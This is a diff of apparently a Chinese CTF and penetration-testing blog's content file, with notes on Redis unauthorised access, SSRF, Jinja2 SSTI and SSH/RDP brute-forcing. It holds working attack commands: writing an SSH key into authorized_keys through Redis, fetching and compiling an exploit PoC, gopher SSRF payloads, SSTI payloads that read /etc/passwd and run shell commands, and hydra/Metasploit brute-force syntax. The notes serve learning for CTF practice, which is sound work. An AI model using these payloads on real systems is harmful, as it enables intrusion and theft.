+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="Redis未授权添加ssh密钥"><a href="#Redis未授权添加ssh密钥" class="headerlink" title="Redis未授权添加ssh密钥"></a>Redis未授权添加ssh密钥</h4><p>1、nmap探测目标是否存在redis服务(6379)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 端口 ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、测试redis服务是否存在未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 服务端地址</span><br><span class="line">info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、ssh密钥生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt;public.txt</span><br><span class="line">两个换行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4、 上传密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat public.txt |redis-cli -h ip -x set x //将文件内容读取到变量x，通过-x执行相关命令，相当于set x=public.txt文件内容</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dir &quot;/home/user/.ssh/&quot; user需要破解，可尝试直接访问/~/.ssh/</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">redis-cli -h ip save </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -l user -i id_rsa ip</span><br><span class="line">连接失败</span><br><span class="line">扫描22端口</span><br><span class="line">nmap -p 22 ip</span><br><span class="line">22端口关闭</span><br><span class="line">扫描所有端口</span><br><span class="line">namp -p 1-65535 -T4 -n -v ip</span><br><span class="line"></span><br><span class="line">发现一个novation服务也是ssh服务标识</span><br><span class="line"></span><br><span class="line">ssh -l user -p 1322 -i</span><br><span class="line">用户名还是需要爆破的，后面连接需要用到。</span><br><span class="line">不具有最高权限</span><br></pre></td></tr></table></figure>
+
+
+
+<p>5、提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <tags>
@@ -821,6 +730,97 @@
 <p>nc监听 8888端口，即可得到flag。</p>
 <p>如果存在特殊字符的文件报错，使用php输入输出流读取文地文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-SSRF</title>
+    <url>/2021/05/25/CTF-SSRF/</url>
+    <content><![CDATA[<h1 id="CTF-SSRF"><a href="#CTF-SSRF" class="headerlink" title="CTF-SSRF"></a>CTF-SSRF</h1><h3 id="SSRF介绍与简单介绍"><a href="#SSRF介绍与简单介绍" class="headerlink" title="SSRF介绍与简单介绍"></a>SSRF介绍与简单介绍</h3><p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多web应用提供从其他服务器获取数据的功能，可根据用户提交URL访问对应资源(获取图片，下载文件，读取内容等)。</span><br><span class="line">如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="SSRF可能造成的危害"><a href="#SSRF可能造成的危害" class="headerlink" title="SSRF可能造成的危害"></a>SSRF可能造成的危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、对内网进行信息探测-端口扫描</span><br><span class="line">2、对内网服务区进行漏洞扫描利用</span><br><span class="line">3、对内网web的应用进行安全测试，如Structs、Sql注入漏洞利用。</span><br><span class="line">4、对内网中的文件读取(file协议)</span><br><span class="line">5、在PHP环境中，如果搭建expect扩展，可能被命令执行。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="SSRF-漏洞-常用函数"><a href="#SSRF-漏洞-常用函数" class="headerlink" title="SSRF 漏洞 常用函数"></a>SSRF 漏洞 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、file_get_contents</span><br><span class="line">PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-将整个文件读入一个字符串。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、fsockopen函数</span><br><span class="line">(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-打开一个网络连接或者一个Unix套接字连接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl函数</span><br><span class="line">参考文档：https://www.php.net/manual/zh/book.curl.php</span><br><span class="line">PHP支持Daniel Stenberg创建的libcurl库，能够连接通讯各种服务器、使用各种协议。libcurl目前支持的协议有http、https、ftp、gopher、telnet、dict、file、ldap。libcurl同时支持HTTPS证书，HTTP POST、HTTP PUT、FTP上传(也能通过PHP的FTP扩展完成)、HTTP基于表单上传、代理、cookies、用户名+密码的认证。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="SSRF绕过限制姿势"><a href="#SSRF绕过限制姿势" class="headerlink" title="SSRF绕过限制姿势"></a>SSRF绕过限制姿势</h3><h4 id="1、添加端口"><a href="#1、添加端口" class="headerlink" title="1、添加端口"></a>1、添加端口</h4><p>HTTP请求URL中默认以80端口。</p>
+<h4 id="2、短网址"><a href="#2、短网址" class="headerlink" title="2、短网址"></a>2、短网址</h4><p><a href="https://sina.lt/">https://sina.lt/</a></p>
+<h4 id="3、指定任意IP的域名xip-io"><a href="#3、指定任意IP的域名xip-io" class="headerlink" title="3、指定任意IP的域名xip.io"></a>3、指定任意IP的域名xip.io</h4><p><a href="https://xip.io/">https://xip.io/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4、数制绕过"><a href="#4、数制绕过" class="headerlink" title="4、数制绕过"></a>4、数制绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址是32位二进制数-&gt;4个字节</span><br><span class="line">目前看到的IP地址都是采用点分十进制组成的。</span><br><span class="line">127.0.0.1 -&gt;  01111111.00000000.00000000.00000001</span><br><span class="line">转化为十进制 -&gt; 2130706433</span><br><span class="line">八进制-&gt; 0177.00.00.01</span><br><span class="line">十六进制 -&gt; 0x7f.0x0.0x0.0x1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5、-跳转"><a href="#5、-跳转" class="headerlink" title="5、@跳转"></a>5、@跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在URL中使用@可跳转到指定的URL</span><br><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">变成http://127.0.0.1</span><br><span class="line">https://www.baidu.com@127.0.0.1</span><br><span class="line">变成https://127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="SSRF可用协议"><a href="#SSRF可用协议" class="headerlink" title="SSRF可用协议"></a>SSRF可用协议</h3><h4 id="1、file协议"><a href="#1、file协议" class="headerlink" title="1、file协议"></a>1、file协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file：//文件路径</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2、dict协议"><a href="#2、dict协议" class="headerlink" title="2、dict协议"></a>2、dict协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用dict协议可探测端口的开放情况和指纹信息</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令格式：</span><br><span class="line">dict://serverip:port/info</span><br><span class="line">dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3、gopher协议"><a href="#3、gopher协议" class="headerlink" title="3、gopher协议"></a>3、gopher协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher是internet上非常有名的信息查找系统，它将internet的文件组织成某种索引，很方便从internet的一处带到另一处。在www出现之前，Gopher是internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是www出现之后，Gopher地位受到打击。Gopher协议在SSRF可以是一个万能协议，可进行GET、POST请求发送。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造Gopher数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包后将整个数据包的</span><br><span class="line">空格替换成%20</span><br><span class="line">问好替换成%3f</span><br><span class="line">回车换行替换成%0d%0a</span><br><span class="line">最后一行也需要%0d%0a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>gopher GET请求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://ip:端口/_数据</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">curl gopher://127.0.0.1:端口/_GET%20/..../?a=...%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>gopher POST请求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与get请求类似，但是需要传入更多的相关信息。</span><br><span class="line">必须有</span><br><span class="line"></span><br><span class="line">POST /.../ HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:9</span><br><span class="line"></span><br><span class="line">a=xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终变成</span><br><span class="line">curl gopher://_POST%20/.../%20HTTP/1.1%0d%0aHost:%20xxx%0d0aContent-Type:%20application/x-www-form-urlencoded%0d0aContent-Length%209%0d0a%0d0aa=xxx%0d%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意 POST有两个换号位置。</span><br><span class="line">%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
       <tags>
         <tag>CTF</tag>
       </tags>
@@ -1279,63 +1279,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SSTI注入</title>
-    <url>/2021/03/13/SSTI%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h2><p><em>又称服务器端模板注入攻击，和sql注入类似，也是用户输入而造成的安全问题。</em></p>
-<p><em>下面是基于python脚本编写的SSTI漏洞。</em></p>
-<p>模板引擎的作用：实现php代码和html代码分离。</p>
-<span id="more"></span>
-
-<p><em><strong>原理：</strong></em></p>
-<p><em><strong>服务器接收了用户的输入，没有对输入的代码过滤或过滤不完全，将用户输入作为web应用模板的一部分，在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露等等。。。</strong></em></p>
-<p><strong>flask中渲染的方法有两种:</strong></p>
-<p><strong>render_template 渲染文件</strong></p>
-<p><strong>render_template_string 渲染字符串</strong></p>
-<p><strong>不正确使用render_template_string会导致SSTI</strong></p>
-<p><em><strong>了解一下python的基本知识：</strong></em></p>
-<p><em><strong><code>__class__   //返回类型所属的对象</code></strong></em></p>
-<p><em><strong><code>__mro__   //返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</code></strong></em></p>
-<p><em><strong><code>__base__   //返回该对象所继承的基类</code></strong></em></p>
-<p><em><strong><code>//base和mro都是用来寻找基类的</code></strong></em></p>
-<p><em><strong><code>__subclasses__   //每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表。</code></strong></em></p>
-<p><em><strong><code>__init__ 类的初始化方法</code></strong></em></p>
-<p><em><strong><code>__globals__: 对包含函数全局变量的字典的引用</code></strong></em></p>
-<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了。</p>
-<h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">request.__class__.mro__[8]//针对jinjia2/flask为[9]适用</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取基本类-object-的子类"><a href="#获取基本类-object-的子类" class="headerlink" title="获取基本类(object)的子类"></a>获取基本类(object)的子类</h4><p><code>object.__subclasses__()</code></p>
-<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses()</code></p>
-<h4 id="找到重载过的-init-类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的"><a href="#找到重载过的-init-类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的" class="headerlink" title="找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)"></a>找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</h4><p><code>&#39;&#39;.__class__.__mro__.__subclasses__()[xx].__init__</code></p>
-<h4 id="查看其引用-builtins"><a href="#查看其引用-builtins" class="headerlink" title="查看其引用_builtins_"></a>查看其引用_<em>builtins</em>_</h4><p>builtins即为引用，python一旦启动，就会在程序员所写的代码没有运行就被加载到内存中，builtins不用导入，在任何模块都有，所以直接引用。</p>
-<p><code>&#39;&#39;.__class__.__mor__[2].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;]</code></p>
-<h4 id="这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能"><a href="#这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能" class="headerlink" title="这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能"></a>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;x://Flag.txt&#39;).read()</code></p>
-<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()  #将read() 修改为 write() 即为写文件</code></p>
-<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可</p>
-<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__().index(file)</code>如返回xx</p>
-<p><code>[].__class__.__base__.__subclasses__()[xx](&#39;/etc/passwd&#39;).read() #将read() 修改为 write() 即为写文件</code></p>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="利用eval进行命令执行"><a href="#利用eval进行命令执行" class="headerlink" title="利用eval进行命令执行"></a>利用eval进行命令执行</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></p>
-<h4 id="利用warnings-catch-warnings进行命令执行"><a href="#利用warnings-catch-warnings进行命令执行" class="headerlink" title="利用warnings.catch_warnings进行命令执行"></a>利用warnings.catch_warnings进行命令执行</h4><p><code>[].__class__.__base__.__subclasses__().index(warning.catch_warnings)</code></p>
-<p>返回a</p>
-<p>查看linecache位置</p>
-<p><code>[].__class__.base__.__subclasses__()[a].__init__.__globals__.keys.index(&#39;linecache&#39;)</code></p>
-<p>返回b</p>
-<p>查找os模块的位置</p>
-<p><code>[].__class__.__base__.__subclasses__()[a].__init__.globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)</code></p>
-<p>返回c</p>
-<p>查找system方法的位置</p>
-<p><code>[].__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[c].__dict__.keys().index(&#39;system&#39;)</code></p>
-<p>返回d</p>
-<p>调用system方法</p>
-<p><code>[].__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[c].__dict__.values()[d](&#39;whoami&#39;)</code></p>
-<h4 id="利用commands进行命令执行"><a href="#利用commands进行命令执行" class="headerlink" title="利用commands进行命令执行"></a>利用commands进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>参考：<a href="https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n">https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n</a></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux-基础知识</title>
     <url>/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h3 id="linux基础知识"><a href="#linux基础知识" class="headerlink" title="linux基础知识"></a>linux基础知识</h3><h4 id="linux反弹shell命令"><a href="#linux反弹shell命令" class="headerlink" title="linux反弹shell命令"></a>linux反弹shell命令</h4><span id="more"></span>
@@ -1438,6 +1381,63 @@ EOF;
 <h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p>有时知道字符串值的长度是很有用的。<br>strlen() 函数返回字符串的长度（字节数）。eg：echo strlen（）输出括号内的字符串长度</p>
 <h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>**提示：字符串中第一个字符的位置是 0，而不是 1。</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>SSTI注入</title>
+    <url>/2021/03/13/SSTI%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h2><p><em>又称服务器端模板注入攻击，和sql注入类似，也是用户输入而造成的安全问题。</em></p>
+<p><em>下面是基于python脚本编写的SSTI漏洞。</em></p>
+<p>模板引擎的作用：实现php代码和html代码分离。</p>
+<span id="more"></span>
+
+<p><em><strong>原理：</strong></em></p>
+<p><em><strong>服务器接收了用户的输入，没有对输入的代码过滤或过滤不完全，将用户输入作为web应用模板的一部分，在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露等等。。。</strong></em></p>
+<p><strong>flask中渲染的方法有两种:</strong></p>
+<p><strong>render_template 渲染文件</strong></p>
+<p><strong>render_template_string 渲染字符串</strong></p>
+<p><strong>不正确使用render_template_string会导致SSTI</strong></p>
+<p><em><strong>了解一下python的基本知识：</strong></em></p>
+<p><em><strong><code>__class__   //返回类型所属的对象</code></strong></em></p>
+<p><em><strong><code>__mro__   //返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</code></strong></em></p>
+<p><em><strong><code>__base__   //返回该对象所继承的基类</code></strong></em></p>
+<p><em><strong><code>//base和mro都是用来寻找基类的</code></strong></em></p>
+<p><em><strong><code>__subclasses__   //每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表。</code></strong></em></p>
+<p><em><strong><code>__init__ 类的初始化方法</code></strong></em></p>
+<p><em><strong><code>__globals__: 对包含函数全局变量的字典的引用</code></strong></em></p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了。</p>
+<h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">request.__class__.mro__[8]//针对jinjia2/flask为[9]适用</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取基本类-object-的子类"><a href="#获取基本类-object-的子类" class="headerlink" title="获取基本类(object)的子类"></a>获取基本类(object)的子类</h4><p><code>object.__subclasses__()</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses()</code></p>
+<h4 id="找到重载过的-init-类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的"><a href="#找到重载过的-init-类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的" class="headerlink" title="找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)"></a>找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</h4><p><code>&#39;&#39;.__class__.__mro__.__subclasses__()[xx].__init__</code></p>
+<h4 id="查看其引用-builtins"><a href="#查看其引用-builtins" class="headerlink" title="查看其引用_builtins_"></a>查看其引用_<em>builtins</em>_</h4><p>builtins即为引用，python一旦启动，就会在程序员所写的代码没有运行就被加载到内存中，builtins不用导入，在任何模块都有，所以直接引用。</p>
+<p><code>&#39;&#39;.__class__.__mor__[2].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;]</code></p>
+<h4 id="这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能"><a href="#这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能" class="headerlink" title="这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能"></a>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;x://Flag.txt&#39;).read()</code></p>
+<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()  #将read() 修改为 write() 即为写文件</code></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可</p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__().index(file)</code>如返回xx</p>
+<p><code>[].__class__.__base__.__subclasses__()[xx](&#39;/etc/passwd&#39;).read() #将read() 修改为 write() 即为写文件</code></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="利用eval进行命令执行"><a href="#利用eval进行命令执行" class="headerlink" title="利用eval进行命令执行"></a>利用eval进行命令执行</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></p>
+<h4 id="利用warnings-catch-warnings进行命令执行"><a href="#利用warnings-catch-warnings进行命令执行" class="headerlink" title="利用warnings.catch_warnings进行命令执行"></a>利用warnings.catch_warnings进行命令执行</h4><p><code>[].__class__.__base__.__subclasses__().index(warning.catch_warnings)</code></p>
+<p>返回a</p>
+<p>查看linecache位置</p>
+<p><code>[].__class__.base__.__subclasses__()[a].__init__.__globals__.keys.index(&#39;linecache&#39;)</code></p>
+<p>返回b</p>
+<p>查找os模块的位置</p>
+<p><code>[].__class__.__base__.__subclasses__()[a].__init__.globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)</code></p>
+<p>返回c</p>
+<p>查找system方法的位置</p>
+<p><code>[].__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[c].__dict__.keys().index(&#39;system&#39;)</code></p>
+<p>返回d</p>
+<p>调用system方法</p>
+<p><code>[].__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[c].__dict__.values()[d](&#39;whoami&#39;)</code></p>
+<h4 id="利用commands进行命令执行"><a href="#利用commands进行命令执行" class="headerlink" title="利用commands进行命令执行"></a>利用commands进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n">https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n</a></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
   <entry>
     <title>攻防世界进阶</title>
@@ -1763,24 +1763,6 @@ EOF;
 ]]></content>
   </entry>
   <entry>
-    <title>Weak Password Burst</title>
-    <url>/2021/01/24/wepd/</url>
-    <content><![CDATA[<h3 id="弱口令破解登陆目标服务器"><a href="#弱口令破解登陆目标服务器" class="headerlink" title="弱口令破解登陆目标服务器"></a>弱口令破解登陆目标服务器</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>nmap
-20:ssh 80:http
-</code></pre>
-<span id="more"></span>
-
-<h4 id="SSH爆破之字典"><a href="#SSH爆破之字典" class="headerlink" title="SSH爆破之字典"></a>SSH爆破之字典</h4><ul>
-<li>Cewl制作字典<br><code>cewl -d 2 -m 5 -w word.txt 网址</code><br>根据提供信息，随机生成一套弱口令密码,密码制作网站:<br><a href="https://bugku.com/mima/">https://bugku.com/mima/</a> <h4 id="Hydra爆破SSH"><a href="#Hydra爆破SSH" class="headerlink" title="Hydra爆破SSH"></a>Hydra爆破SSH</h4>kali自带<br>hydra -I 用户名(-L 用户名字典) -p 密码(-P word.txt) 网址 -s 端口(开放状态) ssh -f(找到一个终止)<h4 id="MSF模块爆破SSH"><a href="#MSF模块爆破SSH" class="headerlink" title="MSF模块爆破SSH"></a>MSF模块爆破SSH</h4><code>search login</code>关于登陆相关模块<br><code>use auxiliary/scanner/ssh/ssh_login</code><br><code>set rhosts 目标ip</code><br><code>set rport 端口</code><br><code>set username root</code><br><code>set pass_file/root/Desktop/word.txt</code><br><code>set threads 10</code><br><code>run</code><h4 id="Hydra爆破RDP-远程桌面协议"><a href="#Hydra爆破RDP-远程桌面协议" class="headerlink" title="Hydra爆破RDP(远程桌面协议)"></a>Hydra爆破RDP(远程桌面协议)</h4>爆破电脑解锁密码<h4 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h4></li>
-</ul>
-<p>御剑RDP爆破工具<br>超级弱口令检查工具</p>
